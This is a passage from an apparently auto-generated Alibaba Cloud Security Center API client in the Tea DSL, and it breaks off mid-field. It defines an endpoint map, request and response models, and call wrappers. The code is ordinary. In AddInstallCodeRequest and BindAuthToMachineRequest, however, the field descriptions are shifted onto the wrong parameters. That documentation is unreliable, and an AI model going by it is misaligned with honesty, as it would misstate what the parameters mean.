/**
 *
 */
import Util;
import OpenApi;
import OpenApiUtil;
import EndpointUtil;

extends OpenApi;


init(config: OpenApi.Config){
  super(config);
  @endpointRule = 'regional';
  @endpointMap = {
    cn-hangzhou = 'tds.aliyuncs.com',
    ap-southeast-1 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-southeast-3 = 'tds.ap-southeast-3.aliyuncs.com',
    ap-northeast-1 = 'sas.aliyuncs.com',
    ap-northeast-2-pop = 'sas.aliyuncs.com',
    ap-south-1 = 'sas.aliyuncs.com',
    ap-southeast-2 = 'sas.aliyuncs.com',
    ap-southeast-5 = 'sas.aliyuncs.com',
    cn-beijing = 'sas.aliyuncs.com',
    cn-beijing-finance-1 = 'sas.aliyuncs.com',
    cn-beijing-finance-pop = 'sas.aliyuncs.com',
    cn-beijing-gov-1 = 'sas.aliyuncs.com',
    cn-beijing-nu16-b01 = 'sas.aliyuncs.com',
    cn-chengdu = 'sas.aliyuncs.com',
    cn-edge-1 = 'sas.aliyuncs.com',
    cn-fujian = 'sas.aliyuncs.com',
    cn-haidian-cm12-c01 = 'sas.aliyuncs.com',
    cn-hangzhou-bj-b01 = 'sas.aliyuncs.com',
    cn-hangzhou-finance = 'sas.aliyuncs.com',
    cn-hangzhou-internal-prod-1 = 'sas.aliyuncs.com',
    cn-hangzhou-internal-test-1 = 'sas.aliyuncs.com',
    cn-hangzhou-internal-test-2 = 'sas.aliyuncs.com',
    cn-hangzhou-internal-test-3 = 'sas.aliyuncs.com',
    cn-hangzhou-test-306 = 'sas.aliyuncs.com',
    cn-hongkong = 'sas.aliyuncs.com',
    cn-hongkong-finance-pop = 'sas.aliyuncs.com',
    cn-huhehaote = 'sas.aliyuncs.com',
    cn-huhehaote-nebula-1 = 'sas.aliyuncs.com',
    cn-north-2-gov-1 = 'sas.aliyuncs.com',
    cn-qingdao = 'sas.aliyuncs.com',
    cn-qingdao-nebula = 'sas.aliyuncs.com',
    cn-shanghai = 'sas.aliyuncs.com',
    cn-shanghai-et15-b01 = 'sas.aliyuncs.com',
    cn-shanghai-et2-b01 = 'sas.aliyuncs.com',
    cn-shanghai-finance-1 = 'sas.aliyuncs.com',
    cn-shanghai-inner = 'sas.aliyuncs.com',
    cn-shanghai-internal-test-1 = 'sas.aliyuncs.com',
    cn-shenzhen = 'sas.aliyuncs.com',
    cn-shenzhen-finance-1 = 'sas.aliyuncs.com',
    cn-shenzhen-inner = 'sas.aliyuncs.com',
    cn-shenzhen-st4-d01 = 'sas.aliyuncs.com',
    cn-shenzhen-su18-b01 = 'sas.aliyuncs.com',
    cn-wuhan = 'sas.aliyuncs.com',
    cn-wulanchabu = 'sas.aliyuncs.com',
    cn-yushanfang = 'sas.aliyuncs.com',
    cn-zhangbei = 'sas.aliyuncs.com',
    cn-zhangbei-na61-b01 = 'sas.aliyuncs.com',
    cn-zhangjiakou = 'sas.aliyuncs.com',
    cn-zhangjiakou-na62-a01 = 'sas.aliyuncs.com',
    cn-zhengzhou-nebula-1 = 'sas.aliyuncs.com',
    eu-central-1 = 'sas.aliyuncs.com',
    eu-west-1 = 'sas.aliyuncs.com',
    eu-west-1-oxs = 'sas.aliyuncs.com',
    me-east-1 = 'sas.aliyuncs.com',
    rus-west-1-pop = 'sas.aliyuncs.com',
    us-east-1 = 'sas.aliyuncs.com',
    us-west-1 = 'sas.aliyuncs.com',
  };

  checkConfig(config);
  @endpoint = getEndpoint('sas', @regionId, @endpointRule, @network, @suffix, @endpointMap, @endpoint);
}

function getEndpoint(productId: string, regionId: string, endpointRule: string, network: string, suffix: string, endpointMap: map[string]string, endpoint: string) throws: string{
  if (!Util.empty(endpoint)) {
    return endpoint;
  }
  
  if (!Util.isUnset(endpointMap) && !Util.empty(endpointMap[regionId])) {
    return endpointMap[regionId];
  }
  return EndpointUtil.getEndpointRules(productId, regionId, endpointRule, network, suffix);
}

model QueryIncidentTracingSubNodesCountRequest {
  vertexIdAndTypeList?: [[ string ]  ](name='VertexIdAndTypeList'),
}

model AddAssetSelectionCriteriaRequest {
  criteria?: string(name='Criteria', example='{"LogicalExp":"AND","Criteria":"[{\\"name\\":\\"osType\\",\\"value\\":\\"linux\\",\\"logicalExp\\":\\"AND\\"},{\\"name\\":\\"alarmStatus\\",\\"value\\":\\"YES\\",\\"logicalExp\\":\\"AND\\"}]"}'),
  criteriaOperation?: string(name='CriteriaOperation', example='add'),
  selectionKey?: string(name='SelectionKey', example='5196d280-5bfa-496a-ba70-8a3935e3****'),
  targetOperationList?: [ 
    {
      operation?: string(name='Operation', example='del'),
      target?: string(name='Target', example='1188****'),
    }
  ](name='TargetOperationList'),
}

model AddAssetSelectionCriteriaResponseBody = {
  requestId?: string(name='RequestId', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model AddAssetSelectionCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddAssetSelectionCriteriaResponseBody(name='body'),
}

async function addAssetSelectionCriteriaWithOptions(request: AddAssetSelectionCriteriaRequest, runtime: Util.RuntimeOptions): AddAssetSelectionCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaOperation)) {
    query['CriteriaOperation'] = request.criteriaOperation;
  }
  if (!Util.isUnset(request.selectionKey)) {
    query['SelectionKey'] = request.selectionKey;
  }
  if (!Util.isUnset(request.targetOperationList)) {
    query['TargetOperationList'] = request.targetOperationList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddAssetSelectionCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addAssetSelectionCriteria(request: AddAssetSelectionCriteriaRequest): AddAssetSelectionCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return addAssetSelectionCriteriaWithOptions(request, runtime);
}

model AddCheckInstanceResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId', description='The ID of the group to which the check item belongs.', example='cQFq20UzZ49K6gRSJD1301****'),
  checkId?: long(name='CheckId', description='The ID of the check item.', example='132'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of assets.'),
}

model AddCheckInstanceResultWhiteListResponseBody = {
  data?: map[string]any(name='Data', description='The adding result.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
}

model AddCheckInstanceResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddCheckInstanceResultWhiteListResponseBody(name='body'),
}

async function addCheckInstanceResultWhiteListWithOptions(request: AddCheckInstanceResultWhiteListRequest, runtime: Util.RuntimeOptions): AddCheckInstanceResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkGroupId)) {
    query['CheckGroupId'] = request.checkGroupId;
  }
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCheckInstanceResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addCheckInstanceResultWhiteList(request: AddCheckInstanceResultWhiteListRequest): AddCheckInstanceResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCheckInstanceResultWhiteListWithOptions(request, runtime);
}

model AddCheckResultWhiteListRequest {
  checkIds?: [ long ](name='CheckIds', description='The IDs of the check items.'),
}

model AddCheckResultWhiteListResponseBody = {
  data?: map[string]any(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
}

model AddCheckResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddCheckResultWhiteListResponseBody(name='body'),
}

async function addCheckResultWhiteListWithOptions(request: AddCheckResultWhiteListRequest, runtime: Util.RuntimeOptions): AddCheckResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCheckResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addCheckResultWhiteList(request: AddCheckResultWhiteListRequest): AddCheckResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCheckResultWhiteListWithOptions(request, runtime);
}

model AddClientUserDefineRuleRequest {
  actionType?: int32(name='ActionType', example='1'),
  cmdline?: string(name='Cmdline', example='/usr/sbin/s****'),
  filePath?: string(name='FilePath', example='/etc/pam****'),
  IP?: string(name='IP', example='10.240.XX.XX'),
  md5List?: string(name='Md5List', example='0c9045b5bec90f9825f1f3f64dd4****'),
  name?: string(name='Name'),
  newFilePath?: string(name='NewFilePath', example='/etc/pam****'),
  parentCmdline?: string(name='ParentCmdline', example='/usr/sbin/s****'),
  parentProcPath?: string(name='ParentProcPath', example='c:/windows/system32/i****'),
  platform?: string(name='Platform', example='linux'),
  port?: int32(name='Port', example='22'),
  portStr?: string(name='PortStr', example='80'),
  procPath?: string(name='ProcPath', example='c:/windows/system32/i****'),
  registryContent?: string(name='RegistryContent', example='*SECOH-QAD.exe*'),
  registryKey?: string(name='RegistryKey', example='HKEY_DYN_****'),
  type?: int32(name='Type', example='1'),
}

model AddClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
  userDefineRuleAddResult?: {
    id?: long(name='Id', example='1'),
    platform?: string(name='Platform', example='linux'),
    switchId?: string(name='SwitchId', example='USER-DEFINE-RULE-SWITCH-TYPE_200****'),
  }(name='UserDefineRuleAddResult'),
}

model AddClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddClientUserDefineRuleResponseBody(name='body'),
}

async function addClientUserDefineRuleWithOptions(request: AddClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): AddClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.actionType)) {
    query['ActionType'] = request.actionType;
  }
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.filePath)) {
    query['FilePath'] = request.filePath;
  }
  if (!Util.isUnset(request.IP)) {
    query['IP'] = request.IP;
  }
  if (!Util.isUnset(request.md5List)) {
    query['Md5List'] = request.md5List;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.newFilePath)) {
    query['NewFilePath'] = request.newFilePath;
  }
  if (!Util.isUnset(request.parentCmdline)) {
    query['ParentCmdline'] = request.parentCmdline;
  }
  if (!Util.isUnset(request.parentProcPath)) {
    query['ParentProcPath'] = request.parentProcPath;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.portStr)) {
    query['PortStr'] = request.portStr;
  }
  if (!Util.isUnset(request.procPath)) {
    query['ProcPath'] = request.procPath;
  }
  if (!Util.isUnset(request.registryContent)) {
    query['RegistryContent'] = request.registryContent;
  }
  if (!Util.isUnset(request.registryKey)) {
    query['RegistryKey'] = request.registryKey;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addClientUserDefineRule(request: AddClientUserDefineRuleRequest): AddClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return addClientUserDefineRuleWithOptions(request, runtime);
}

model AddInstallCodeRequest {
  expiredDate?: long(name='ExpiredDate', description='6134', example='1680257463853'),
  groupId?: long(name='GroupId', description='Specifies whether to create an image. Default value: **false**. Valid values:

*   **false**: does not create an image.
*   **true**: creates an image.', example='8076980'),
  onlyImage?: boolean(name='OnlyImage', description='The operating system of the instance. Default value: **linux**. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='false'),
  os?: string(name='Os', description='The ID of the request, which is used to locate and troubleshoot issues.', example='linux'),
  vendorName?: string(name='VendorName', description='The ID of the asset group to which the you want to add the asset.

>  You can call the [DescribeAllGroups](~~describeallgroups~~) operation to query the IDs of asset groups.', example='ALIYUN'),
}

model AddInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The validity period of the installation command. The value is a 13-digit timestamp.

>  The installation command is valid only within the validity period. An expired installation command cannot be used to install the Security Center agent.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model AddInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddInstallCodeResponseBody(name='body'),
}

async function addInstallCodeWithOptions(request: AddInstallCodeRequest, runtime: Util.RuntimeOptions): AddInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.expiredDate)) {
    query['ExpiredDate'] = request.expiredDate;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.onlyImage)) {
    query['OnlyImage'] = request.onlyImage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.vendorName)) {
    query['VendorName'] = request.vendorName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addInstallCode(request: AddInstallCodeRequest): AddInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return addInstallCodeWithOptions(request, runtime);
}

model AddPrivateRegistryRequest {
  domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
  extraParam?: string(name='ExtraParam', description='The additional parameter of the image repository. This parameter is required when you set the RegistryType parameter to **quay**. Valid values:

*   **namespace**
*   **authToken**', example='[{"namespace":"aa","authToken":"aa"}]'),
  netType?: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: virtual private cloud (VPC)', example='2'),
  password?: string(name='Password', description='The password that is used to log on to the image repository.', example='******'),
  protocolType?: long(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='2'),
  registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.**.**'),
  registryRegionId?: string(name='RegistryRegionId', description='The ID of the region.

> You can call the [ListImageRegistryRegions](~~ListImageRegistryRegions~~) operation to query the IDs of supported regions.', example='cn-hangzhou'),
  registryType?: string(name='RegistryType', description='The type of the private image repository. Valid values:

*   **harbor**
*   **quay**', example='harbor'),
  registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Valid values:

*   **V1**
*   **V2**', example='V2'),
  transPerHour?: int32(name='TransPerHour', description='The number of images that are scanned per hour.', example='10'),
  userName?: string(name='UserName', description='The username that is used to log on to the image repository.', example='xxxxx'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-wz9hs3e5*******908kd'),
}

model AddPrivateRegistryResponseBody = {
  data?: {
    aliUid?: long(name='AliUid', description='The ID of the user.', example='1766185894104***'),
    domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
    id?: long(name='Id', description='The ID of the image repository.', example='273698***'),
    netType?: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: VPC', example='2'),
    password?: string(name='Password', description='The password.', example='***********'),
    protocolType?: long(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='2'),
    regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
    registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.**.**'),
    registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **harbor**
*   **quay**', example='harbor'),
    registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Default value: -. Valid values:

*   **-**: the default version
*   **V1**
*   **V2**', example='V2'),
    token?: string(name='Token', description='The value of the token.', example='3c3c602c-fa1f-4bc0-992f-b4b2cac7****'),
    transPerHour?: int32(name='TransPerHour', description='The number of scan tasks that are performed per hour.', example='10'),
    userName?: string(name='UserName', description='The username.', example='******'),
    vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-2vchkxmf2j9yjt3x2****'),
  }(name='Data', description='The handling result.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model AddPrivateRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddPrivateRegistryResponseBody(name='body'),
}

async function addPrivateRegistryWithOptions(request: AddPrivateRegistryRequest, runtime: Util.RuntimeOptions): AddPrivateRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.domainName)) {
    query['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.extraParam)) {
    query['ExtraParam'] = request.extraParam;
  }
  if (!Util.isUnset(request.netType)) {
    query['NetType'] = request.netType;
  }
  if (!Util.isUnset(request.password)) {
    query['Password'] = request.password;
  }
  if (!Util.isUnset(request.protocolType)) {
    query['ProtocolType'] = request.protocolType;
  }
  if (!Util.isUnset(request.registryHostIp)) {
    query['RegistryHostIp'] = request.registryHostIp;
  }
  if (!Util.isUnset(request.registryRegionId)) {
    query['RegistryRegionId'] = request.registryRegionId;
  }
  if (!Util.isUnset(request.registryType)) {
    query['RegistryType'] = request.registryType;
  }
  if (!Util.isUnset(request.registryVersion)) {
    query['RegistryVersion'] = request.registryVersion;
  }
  if (!Util.isUnset(request.transPerHour)) {
    query['TransPerHour'] = request.transPerHour;
  }
  if (!Util.isUnset(request.userName)) {
    query['UserName'] = request.userName;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddPrivateRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addPrivateRegistry(request: AddPrivateRegistryRequest): AddPrivateRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return addPrivateRegistryWithOptions(request, runtime);
}

model AddTagWithUuidRequest {
  tagName?: string(name='TagName', description='The name of the tag.', example='InternetIp'),
  uuidList?: string(name='UuidList', description='The UUIDs of the servers. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='71f5313e-4355-4c59-86d1-557dda7b****,71f5313e-4355-4c59-86d1-557dda7b****'),
}

model AddTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model AddTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddTagWithUuidResponseBody(name='body'),
}

/**
  * Security Center provides asset importance tags and custom tags. You can call the AddTagWithUuid operation to add only a custom tag to assets.
  *
  * @param request AddTagWithUuidRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return AddTagWithUuidResponse
 */
async function addTagWithUuidWithOptions(request: AddTagWithUuidRequest, runtime: Util.RuntimeOptions): AddTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tagName)) {
    query['TagName'] = request.tagName;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * Security Center provides asset importance tags and custom tags. You can call the AddTagWithUuid operation to add only a custom tag to assets.
  *
  * @param request AddTagWithUuidRequest
  * @return AddTagWithUuidResponse
 */
async function addTagWithUuid(request: AddTagWithUuidRequest): AddTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return addTagWithUuidWithOptions(request, runtime);
}

model AddUninstallClientsByUuidsRequest {
  callMethod?: string(name='CallMethod', example='init'),
  feedback?: string(name='Feedback', example='reinstall'),
  region?: string(name='Region', example='cn-hangzhou'),
  sourceIp?: string(name='SourceIp', example='1.2.XXX.XXX'),
  uuids?: string(name='Uuids', example='inet-183707ae-3bdf-4db0-b771-3e9962bf****,inet-49dceccc-4f01-469b-8411-2416ea12****'),
}

model AddUninstallClientsByUuidsResponseBody = {
  requestId?: string(name='RequestId', example='3956048F-9D73-5EDB-834B-4827BB483977'),
}

model AddUninstallClientsByUuidsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddUninstallClientsByUuidsResponseBody(name='body'),
}

async function addUninstallClientsByUuidsWithOptions(request: AddUninstallClientsByUuidsRequest, runtime: Util.RuntimeOptions): AddUninstallClientsByUuidsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.callMethod)) {
    query['CallMethod'] = request.callMethod;
  }
  if (!Util.isUnset(request.feedback)) {
    query['Feedback'] = request.feedback;
  }
  if (!Util.isUnset(request.region)) {
    query['Region'] = request.region;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddUninstallClientsByUuids',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addUninstallClientsByUuids(request: AddUninstallClientsByUuidsRequest): AddUninstallClientsByUuidsResponse {
  var runtime = new Util.RuntimeOptions{};
  return addUninstallClientsByUuidsWithOptions(request, runtime);
}

model AddVpcHoneyPotRequest {
  vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC) in which you want to create a honeypot.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to obtain the VPC ID. The VPC ID is the value of the InstanceId parameter.', example='vpc-p0w5fgkfsl5a6791q****'),
}

model AddVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model AddVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddVpcHoneyPotResponseBody(name='body'),
}

async function addVpcHoneyPotWithOptions(request: AddVpcHoneyPotRequest, runtime: Util.RuntimeOptions): AddVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addVpcHoneyPot(request: AddVpcHoneyPotRequest): AddVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return addVpcHoneyPotWithOptions(request, runtime);
}

model AdvanceSecurityEventOperationsRequest {
  eventName?: string(name='EventName'),
  eventType?: string(name='EventType'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  ruleId?: int32(name='RuleId', example='123'),
}

model AdvanceSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-XXXXXXXXX'),
  securityEventOperationsResponse?: [ 
    {
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', example='file path'),
          filedName?: string(name='FiledName', example='filePath'),
          markMisType?: string(name='MarkMisType', example='contains'),
          markMisValue?: string(name='MarkMisValue', example='2022-04-25 10:11:04'),
          supportedMisType?: [ string ](name='SupportedMisType'),
        }
      ](name='MarkField'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', example='file path'),
          filedName?: string(name='FiledName', example='filePath'),
          markMisValue?: string(name='MarkMisValue', example='contains'),
          supportedMisType?: [ string ](name='SupportedMisType'),
        }
      ](name='MarkFieldsSource'),
      operationCode?: string(name='OperationCode', example='advance_mark_mis_info'),
      operationParams?: string(name='OperationParams', example='{\\"subOperation\\":\\"killByMd5andPath\\"}'),
      userCanOperate?: boolean(name='UserCanOperate', example='false'),
    }
  ](name='SecurityEventOperationsResponse'),
}

model AdvanceSecurityEventOperationsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AdvanceSecurityEventOperationsResponseBody(name='body'),
}

async function advanceSecurityEventOperationsWithOptions(request: AdvanceSecurityEventOperationsRequest, runtime: Util.RuntimeOptions): AdvanceSecurityEventOperationsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.eventType)) {
    query['EventType'] = request.eventType;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AdvanceSecurityEventOperations',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function advanceSecurityEventOperations(request: AdvanceSecurityEventOperationsRequest): AdvanceSecurityEventOperationsResponse {
  var runtime = new Util.RuntimeOptions{};
  return advanceSecurityEventOperationsWithOptions(request, runtime);
}

model BatchOperateCommonOverallConfigRequest {
  config?: string(name='Config', example='on'),
  typeList?: [ string ](name='TypeList'),
}

model BatchOperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId', example='765EDBDE-1686-5DBA-B76F-2E0E6E7E1B96'),
}

model BatchOperateCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: BatchOperateCommonOverallConfigResponseBody(name='body'),
}

async function batchOperateCommonOverallConfigWithOptions(request: BatchOperateCommonOverallConfigRequest, runtime: Util.RuntimeOptions): BatchOperateCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BatchOperateCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function batchOperateCommonOverallConfig(request: BatchOperateCommonOverallConfigRequest): BatchOperateCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return batchOperateCommonOverallConfigWithOptions(request, runtime);
}

model BindAuthToMachineRequest {
  authVersion?: int32(name='AuthVersion', description='The edition of Security Center. Valid values:

*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='6'),
  autoBind?: int32(name='AutoBind', description='The shortage in the quota for cores of servers that can be protected.', example='1'),
  bind?: [ string ](name='Bind', description='The ID of the request, which is used to locate and troubleshoot issues.'),
  bindAll?: boolean(name='BindAll', description='The UUID of the server that you want to bind to Security Center.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='true'),
  criteria?: string(name='Criteria', description='The status code that indicates the result. Valid values:

